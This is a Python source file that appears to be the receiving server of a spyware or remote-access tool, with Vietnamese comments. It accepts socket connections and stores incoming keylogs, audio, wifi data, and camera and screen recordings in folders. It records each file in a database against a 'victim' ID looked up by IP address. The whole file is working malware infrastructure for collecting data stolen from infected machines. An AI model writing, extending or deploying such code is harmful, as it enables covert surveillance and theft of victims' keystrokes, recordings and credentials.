import os
import socket
import time
from datetime import datetime
from database.connect.connect import *
def get_file_type_folder(filename):
    """Determine the appropriate subfolder based on filename"""
    if filename.lower().startswith('keylog'):
        return 'keylog'
    elif filename.lower().endswith('.wav'):
        return 'audio'
    elif filename.lower().startswith('wifi'):
        return 'wifi'
    elif filename.lower().startswith('camera_record'):
        return os.path.join('videos', 'camera')
    elif filename.lower().startswith('screen_record'):
        return os.path.join('videos', 'screen')
    return '' 

def receive_file(host, ip, port, save_directory='received_files'):
    """Receive files and organize them into appropriate subfolders"""
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)
        
    db_connection = connect_to_database()
    if not db_connection:
        print("Không thể kết nối cơ sở dữ liệu. Thoát chương trình.")
        return
    victim_id = get_victimid_by_ip(ip)
    if victim_id is None:
        print(f"Không tìm thấy nạn nhân với IP {ip}.")
        return

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Listening for files on {host}:{port}")
        conn, addr = s.accept()
        sender_ip = addr[0]
        print(f"Connected by {sender_ip}")
        
        with conn:
            while True:
                try:
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    print(f"Received file info: {file_info}")
                    if not file_info:
                        print("No more file info received.")
                        return False

                    # Validate the format of file_info
                    parts = file_info.split('|')
                    if len(parts) != 2:
                        print(f"Invalid file info received: {file_info}")
                        continue

                    filename, filesize = parts
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    # Add timestamp to filename to prevent overwriting
                    name, ext = os.path.splitext(filename)
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    filename = f"{name}_{timestamp}{ext}"

                    # Determine appropriate subfolder
                    subfolder = get_file_type_folder(filename)
                    if subfolder:
                        full_save_dir = os.path.join(save_directory, subfolder)
                        os.makedirs(full_save_dir, exist_ok=True)
                    else:
                        full_save_dir = save_directory

                    filepath = os.path.join(full_save_dir, filename)
                    with open(filepath, 'wb') as f:
                        remaining = filesize
                        while remaining > 0:
                            chunk_size = 4096 if remaining >= 4096 else remaining
                            chunk = conn.recv(chunk_size)
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                        print(f"Received {filename} successfully! Saved to {filepath}")
                    
                    # Lưu thông tin tệp vào cơ sở dữ liệu
                    upload_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    insert_file_info(db_connection, victim_id, filename, filepath, upload_time)
                    insert_log(db_connection, victim_id, "File", upload_time)

                except Exception as e:
                    print(f"Error receiving file: {e}")
                    break
    return False